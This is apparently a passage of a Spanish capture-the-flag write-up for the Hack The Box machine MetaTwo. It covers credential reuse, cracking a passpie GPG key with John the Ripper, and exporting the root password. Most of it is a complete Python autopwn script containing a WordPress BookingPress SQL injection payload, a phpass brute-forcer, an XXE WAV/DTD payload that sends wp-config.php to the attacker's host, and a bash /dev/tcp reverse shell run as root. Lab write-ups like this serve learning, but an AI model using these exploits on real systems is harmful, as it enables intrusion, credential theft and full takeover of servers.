local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||64863|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |**********************************************************************************************************************************************|  1126       14.12 MiB/s    00:00 ETA
226 Transfer complete
```

Conseguimos descargar el archivo `send_email.php` en el cúal se encontraban las credenciales del servicio **PHPMailer** del un usuario `jnelson:Cb4_JmWM8zUZWMu@Ys`:

```php
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

Finalmente el usuario `jnelson` rehusó estas credenciales y por ello conseguimos entrar por el puerto **22(SSH)** y conseguir la flag:

```console
❯ ssh jnelson@10.10.11.186
jnelson@10.10.11.186's password: 
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 16 19:19:40 2022 from 10.10.14.50
jnelson@meta2:~$ find / -name user.txt -exec ls -l {} + 2>/dev/null
-rw-r----- 1 root jnelson 33 Nov 16 17:08 /home/jnelson/user.txt
```

## Privilege Escalation

* * *

En el proceso de una enumeración básica por el sistema, encontramos en nuestra de usuario el archivo `.passpie`. Investigando encontramos que Passpie **es una herramienta de línea de comandos para administrar contraseñas desde el terminal**:

```console
jnelson@meta2:~$ passpie 
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

> Passpie documentation: [https://passpie.readthedocs.io/en/latest/getting_started.html](https://passpie.readthedocs.io/en/latest/getting_started.html)
{: .prompt-info}

Listamos todos los archivos:

```console
jnelson@meta2:~$ ls -laR .passpie/
.passpie/:
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 5 jnelson jnelson 4096 Nov 16 22:13 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26 13:57 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh

.passpie/ssh:
total 16
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 .
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 ..
-r-xr-x--- 1 jnelson jnelson  683 Oct 25 12:52 jnelson.pass
-r-xr-x--- 1 jnelson jnelson  673 Oct 25 12:52 root.pass
```

Como es mi primera vez viendo este programa tuve que leer la documentación y encontre algo interesante:

![https://passpie.readthedocs.io/en/latest/getting\_started.html#exporting-credentials](passpie_gnupg_keys.png){: .shadow}

Entonces teniendo esta "llave" podremos obtener las credenciales que listamos anteriormente. Para ello, traemos estas llaves a nuestra máquina para poder crackearlas:

> Ya que ambas llaves (pública / privada) vienen en un mismo archivo, las separamos y trabajamos con la privada

```console
❯ head passpie_private_gnupg
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb

❯ gpg2john passpie_private_gnupg > passpie_private_gnupg_hash

File passpie_private_gnupg

❯ john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt passpie_private_gnupg_hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:05 DONE (2022-11-16 17:31) 0.1972g/s 32.54p/s 32.54c/s 32.54C/s peanut..sweetie
```

Ahora solo exportamos las credenciales de la base de datos passpie en un archivo especificado:

```console
jnelson@meta2:~$ passpie export user_credentials
Passphrase: 
jnelson@meta2:~$ cat user_credentials 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

Por último, hacemos un pivoting al usuario `root` y conseguimos la última flag:

```console
jnelson@meta2:~$ su root
Password: 
root@meta2:/home/jnelson# find / -name root.txt -exec ls -l {} \;
-rw-r----- 1 root root 33 Nov 16 17:08 /root/root.txt
```

A modo de práctica hice un script en `python` para automatizar todo el proceso:

```python
#!/usr/env/bin python3

"""
Metatwo Autopwn HTB
-------------------
Author: Marss
Date: 10 Nov, 2022
"""
import pdb
import argparse
import base64
import gzip
import os
import paramiko
import re
import requests
import shlex
import signal
import socket
import subprocess
import sys
import threading

from ftplib import FTP
from passlib.hash import phpass
from pwn import *
from threading import Thread


## Ctrl + c
# (function)
def signal_handler(signum, frame):
	sys.exit("\n[!] User terminated.")

# (signal)
signal.signal(signal.SIGINT, signal_handler)


## Main class
class Exploit:

	def __init__(self, args):
		"""
		Initialize variables to all process:
		
		Remember add metapress.htb domain to /etc/hosts
		"""
		self.target_host = {
			'ip_address' : '10.10.11.186', 
			'url_domain' : 'http://metapress.htb'
		}

		self.ip_address = args.ip
		self.port = args.port

		self.compressed_wordlist = 'rockyou.txt.gz'
		self.credentials = {}

		self.stop_threads = False

		self.wav_file_name = 'malicious.wav'
		self.dtd_file_name = 'malicious.dtd'

		self.log_file_name = 'xxe_request.log'

		self.exposed_ftp_file = 'send_email.php'

		self.passpie_keys_file = 'passpie_keys'
		self.passpie_private_key = 'passpie_private_key'

	def run(self):
		"""
		Exploit process: 
		(1) Bookpress plugin [CVE-2022-0739] (Unauthenticated SQL injection)
			* Wordpress manager user credentials
			* Decrypt manager password [Bruteforce]
		
		(2) Media library [CVE-2021-29447] (Authenticated XXE [PHP 8])
			* wp-config.php: metapress.htb FTP credentials
		
		(3) FTP login (Leakage Information)
			* send_email.php: jnelson PHPMailer credentials
		
		(4) SSH login (Reused Credentials)
			* Crack GPG keys of Password Manager [passpie]
			* Export encrypted credentials in plaintext
		
		(5) Pivot to root user
			* Send reverse shell ?
		"""

		with log.progress('Starting Attack') as progress:

			progress.status('Unauthenticated SQL injection (CVE-2022-0739)'); time.sleep(2)
			manager_password_hash = self.sql_injection()
			log.info('extracted manager user password hash (CVE-2022-0739)')

			progress.status('Starting Brute-force attack'); time.sleep(2)
			with log.progress('Cracking password') as progress_2:
				self.bruteforce_attack(manager_password_hash, self.get_wordlist(), progress_2)
			log.success('manager password -> {}'.format(self.credentials['manager']))

			progress.status('Authenticated XXE [PHP 8] (CVE-2021-29447)'); time.sleep(2)
			self.create_xxe_files(target_file_path="../wp-config.php")
			log.info('malicious XXE files created : {}, {} (CVE-2021-29447)'.format(self.wav_file_name, self.dtd_file_name))
			
			progress.status('Uploading .wav file to receive wp-config.php'); time.sleep(2)
			self.wordpress_authentication()
			log.info('xxe attack requests log file : {}'.format(self.log_file_name))

			progress.status('Extracting FTP credentials of log_file'); time.sleep(2)
			self.extract_ftp_credentials()
			log.success('ftp credentials -> {}:{} (Leakage Information)'.format(self.credentials['ftp_user'], self.credentials['ftp_pass']))
			
			progress.status('FTP logging to extract SSH credentials from exposed file ({})'.format(self.exposed_ftp_file)); time.sleep(2)
			self.ftp_login()
			log.success('ssh credentials -> {}:{} (Reused Credentials)'.format(self.credentials['ssh_user'], self.credentials['ssh_pass']))

			progress.status('SSH loggin to extract GPG keys of Password Manager (passpie)'); time.sleep(2)
			self.download_keys_file(
				ssh_client=self.ssh_connection(
					self.credentials['ssh_user'], 
					self.credentials['ssh_pass']
				)
			)
			log.info('extracted gpg keys file : {}'.format(self.passpie_keys_file))

			progress.status('Extracting private key of gpg key file'); time.sleep(2)
			self.extract_pgp_private_key()
			log.info('gpg private key file : {}'.format(self.passpie_private_key))
			
			progress.status('Cracking gpg private key with John the Ripper'); time.sleep(2)
			self.crack_gpg_key()
			log.success('cracked passpie password -> {}'.format(self.credentials['passpie_pass']))

			progress.status('SSH login to extract root password'); time.sleep(2)
			self.extract_root_pass(
				ssh_client=self.ssh_connection(
					self.credentials['ssh_user'],
					self.credentials['ssh_pass']
				)
			)
			log.success('extracted root password -> {}'.format(self.credentials['root_pass']))

			progress.status('Running reverse shell as root user to get a shell'); time.sleep(2)
			self.get_shell()

	def extract_wp_nonce(self, response, nonce_type):
		try:
			if nonce_type == 1:			
				return re.findall("_wpnonce:'(.*?)'", response.text)[0]
			elif nonce_type == 2:
				return re.findall('"_wpnonce":"(.*?)"', response.text)[0]
			
		except Exception as error:
			sys.exit("\n[X] Error: %s" % error)

	def sql_injection(self):
		try:
			response = requests.get(self.target_host['url_domain'] + '/events/')

			wp_nonce = self.extract_wp_nonce(response, 1)

			post_data = {
				'action' : 'bookingpress_front_get_category_services',
				'_wpnonce' : wp_nonce,
				'category_id' : '1',
				'total_service' : '-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, user_pass, 0x7c) from wp_users#'
			}

			response = requests.post(self.target_host['url_domain'] + '/wp-admin/admin-ajax.php', 
				data=post_data)

			manager_password_hash = re.findall("\|(.*?)\|", response.text)[1]

			return manager_password_hash

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)
	
	def get_wordlist(self):
		with gzip.open(self.compressed_wordlist, mode='rt', errors='replace') as file: # errors='replace' (UnicodeDecodeError)
			wordlist = file.readlines()
		
		return wordlist

	def divide_wordlist(self, wordlist, wordlist_len):
		"""
		yield:

		keyword to return a value like any function 
		but in its next execution it will start from its last call 
		"""
		for i in range(0, len(wordlist), wordlist_len):
			yield wordlist[i:i + wordlist_len]

	def bruteforce_attack(self, password_hash, complete_wordlist, progress_log):
		"""
		Thread implementation

		Split wordlist into subwordlists based on number of threads
		"""
		num_threads = 50 # testing 50 (1:58)
		
		wordlist_list = list(self.divide_wordlist(complete_wordlist, (len(complete_wordlist) // num_threads)))

		password_hash = password_hash.replace("\/", "/") # remove escape character
		rounds, salt = self.extract_hash_parts(password_hash)

		threads_list = []
		# add each sublist to thread list
		for sub_wordlist in wordlist_list:
			threads_list.append(
				Thread(
					target=self.decrypt_password_hash, 
					args=(password_hash, rounds, salt, sub_wordlist, progress_log)
				))

		# start list threads
		for thread in threads_list:
			thread.start()
		# waits for threads to terminate
		for thread in threads_list:
			thread.join()

	def extract_hash_parts(self, password_hash):
		"""
		  $P$       B      4aNM28N0  E.tMy/JIcnVMZbGcU16Q70
		{prefix} {rounds}   {salt}         {checksum}
		           1 ch      8 ch             22 ch
		"""
		rounds = int(password_hash[3], base=16) + 2 # encoding a 6-bit integer
		salt = password_hash[4:12]
		
		return rounds, salt

	def decrypt_password_hash(self, password_hash, rounds, salt, sub_wordlist, progress_log):
		try:
			for word in sub_wordlist:
				if self.stop_threads:
					break

				progress_log.status(word.strip())
				_hash = phpass.hash(word.strip(), salt=salt, rounds=rounds)

				if _hash == password_hash:
					self.credentials['manager'] = word.strip()
					self.stop_threads = True
					break
					
		except Exception as error:
			sys.exit("\n[X] Error: %s" % error)

	def create_xxe_files(self, target_file_path):
		"""
		(1) .wav file 
		(2) .dtd file
		"""
		# (1)
		wav_file_content = "RIFFXXXXWAVEiXMLBBBB<?xml version=\"1.0\"?><!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"http://{}:{}/{}\">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>>" \
			.format(self.ip_address, self.port, self.dtd_file_name)

		with open(self.wav_file_name, "wb") as file:
			file.write(wav_file_content.encode())

		# extrac file size
		wav_file_object = os.stat(self.wav_file_name)
		wav_size_bytes = wav_file_object.st_size

		# calcule bytes of xml payload (important to work!)
		little_endian_bytes = chr(wav_size_bytes - 20) + "\x00\x00" # 0xc2 added (weird behavior) ?

		wav_file_content = wav_file_content.replace("BBBB", little_endian_bytes)
		
		with open(self.wav_file_name, "wb") as file:
			file.write(wav_file_content.encode())
		
		# (2)
		dtd_file_content = "<!ENTITY % data SYSTEM \"php://filter/read=convert.base64-encode/resource={}\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://{}:{}/?=%data;'>\">" \
		.format(target_file_path, self.ip_address, self.port)
		
		with open(self.dtd_file_name, "wt") as file:
			file.write(dtd_file_content)

	def share_server(self):
		"""
		Create server with python to receive XXE response (wp-config.php)
		and save into a log file
		"""
		with open(self.log_file_name, 'wt') as log_file:
			command = "python3 -m http.server {}".format(self.port)
			python_server = subprocess.Popen(shlex.split(command), stdout=log_file, stderr=log_file)
			
		return python_server

	def wordpress_authentication(self):
		"""
		(1) Login with manager credentials
		(2) Upload malicious .wav file
		"""
		try:
			with requests.Session() as session:
				# (1)
				headers = { 'Content-type' : 'application/x-www-form-urlencoded' }

				form_data = {
					'log' : list(self.credentials.keys())[0],
					'pwd' : self.credentials['manager'],
					'wp-submit' : 'Log+In' 
				}

				session.post(self.target_host['url_domain'] + '/wp-login.php', 
					headers=headers, 
					data=form_data)

				# (2)
				file_data = {
					'async-upload' : (
						self.wav_file_name,
						open(self.wav_file_name, 'rb'),
						'audio/wav'
					),
				}

				response = session.get(self.target_host['url_domain'] + '/wp-admin/media-new.php')

				wp_nonce = self.extract_wp_nonce(response, 2)

				form_data = {
					'_wpnonce' : wp_nonce
				}

				# implement subprocess to receive log requests
				server_process = self.share_server()

				# upload file
				session.post(self.target_host['url_domain']  + '/wp-admin/async-upload.php', 
					files=file_data, 
					data=form_data)
				
				# terminate process
				server_process.kill()

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

	def extract_ftp_credentials(self):
		with open(self.log_file_name, 'rt') as log_file:
			log_content = log_file.readlines()

		# extract base64 content of log file
		base64_content = re.findall("GET /\?=(.*?) HTTP/1.1", log_content[1])[0]

		# decode base64 content
		base64_bytes = base64_content.encode('ascii')
		content_bytes = base64.b64decode(base64_bytes)
		plaintext_content = content_bytes.decode('ascii')

		# get ftp credentials
		self.credentials['ftp_user'] = re.findall("'FTP_USER', '(.*?)'", plaintext_content)[0]
		self.credentials['ftp_pass'] = re.findall("'FTP_PASS', '(.*?)'", plaintext_content)[0]
		
	def ftp_login(self):
		"""
		Login to ftp and download send_mailer.php 
		and extract jnelson credentials
		"""
		try:
			ftp_session = FTP('metapress.htb', 
				user=self.credentials['ftp_user'], 
				passwd=self.credentials['ftp_pass'])

			with open(self.exposed_ftp_file, 'wb') as file:
				ftp_session.retrbinary(f"RETR /mailer/{self.exposed_ftp_file}", file.write)

			with open(self.exposed_ftp_file, 'r') as ftp_file:
				ftp_content = ftp_file.read()
				
				self.credentials['ssh_user'] = re.findall("\$mail->Username = \"(.*?)\"", ftp_content)[0].split("@")[0]
				self.credentials['ssh_pass'] = re.findall("\$mail->Password = \"(.*?)\"", ftp_content)[0]

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

	def download_keys_file(self, ssh_client):
		"""
		SSH connection like jnelson to extract passpie .keys file
		"""
		with ssh_client.open_sftp() as sftp_client:
			sftp_client.get("/home/jnelson/.passpie/.keys", f"./{self.passpie_keys_file}")

		ssh_client.close()

	def ssh_connection(self, ssh_user, ssh_pass):
		"""
		SSH connection like a user
		"""
		try:
			ssh_client = paramiko.SSHClient()
			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh_client.connect(self.target_host['ip_address'], 
				port=22,
				username=ssh_user, 
				password=ssh_pass)

			return ssh_client

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

	def extract_pgp_private_key(self):
		with open(self.passpie_keys_file, "rt") as keys_file:
			keys_file_content = keys_file.read()

		passpie_private_key_content = re.findall("(?s)-----BEGIN .+?-----.+?-----END .+?-----\n", keys_file_content)[1]

		with open(self.passpie_private_key, "wt") as key_file:
			key_file.write(passpie_private_key_content)

	def crack_gpg_key(self):
		try:
			# create gpg hash with john
			command = 'gpg2john passpie_private_key > passpie_private_key_hash'
			crack_process = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

			# crack gpg hash
			command = 'john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt passpie_private_key_hash'
			john_output = subprocess.run(command, capture_output=True, shell=True)
			
			# extract passpie password
			if "No password hashes left to crack (see FAQ)" in john_output.stdout.decode():
				# if has been cracked before
				john_output = subprocess.run("john --show passpie_private_key_hash", capture_output=True, shell=True)
				self.credentials['passpie_pass'] = re.findall("(Passpie:.*):::", john_output.stdout.decode())[0].split(':')[1]

				return

			# first time cracking
			self.credentials['passpie_pass'] = re.findall("(.*?)\s+\(Passpie\)", john_output.stdout.decode())[0]

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

	def extract_root_pass(self, ssh_client):
		"""
		SSH connection like jnelson to export users credentials in plaintext
		"""
		with ssh_client as ssh_client:
			# create personal workstation
			ssh_client.exec_command("mkdir -p /tmp/.{}".format(self.ip_address))
			
			# save credentials
			_stdin, _stdout, _stderr = ssh_client.exec_command("passpie export /tmp/.{}/user_credentials".format(self.ip_address))
			_stdin.write(self.credentials['passpie_pass'] + "\n")
			_stdin.flush()

			# wait until the file is created
			time.sleep(5)
			
			# open credentials file and extract root password
			_stdin, _stdout, _stderr = ssh_client.exec_command("cat /tmp/.{}/user_credentials".format(self.ip_address))
			
			self.credentials['root_pass'] = re.findall("password: .*? '(.*?)'\s", _stdout.read().decode())[0]

			# remove personal workstation
			ssh_client.exec_command("rm -r /tmp/.{}".format(self.ip_address))

	def get_shell(self):
		"""
		Send reverse shell to local machine
		"""
		try:
			ssh_client = self.ssh_connection(self.credentials['ssh_user'], self.credentials['ssh_pass'])

			reverse_shell = "su root -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(self.ip_address, self.port)
			_stdin, _stdout, _stderr = ssh_client.exec_command(reverse_shell)
			_stdin.write(self.credentials['root_pass'] + '\n')
			_stdin.flush()

			shell = listen(self.port, timeout=20).wait_for_connection()

			if shell.sock:
				log.info('Press Ctrl + D to exit.')
				shell.interactive()

		except Exception as error:
			sys.exit('\n[X] Error: %s' % error)

## Main flow
if __name__ == '__main__':
	ascii_title = """
	|\/|  _  _|_  _. _|_       _     /\      _|_  _  ._       ._  
	|  | (/_  |_ (_|  |_ \/\/ (_)   /--\ |_|  |_ (_) |_) \/\/ | |
	                                                 |
	                                                         by marss
	"""

	parser = argparse.ArgumentParser(
		description=ascii_title,
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		""")

	parser.add_argument('-i', '--ip', required=True, help="Specified IP to receive the shell")
	parser.add_argument('-p', '--port', required=True, help="Specified PORT to receive the shell")

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)

	exploit.run()
```

![PoC](autopwn.png){: .shadow}

> Puedes encontrar el script y sus requerimientos en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_MetaTwo/autopwn)
{: .prompt-info}
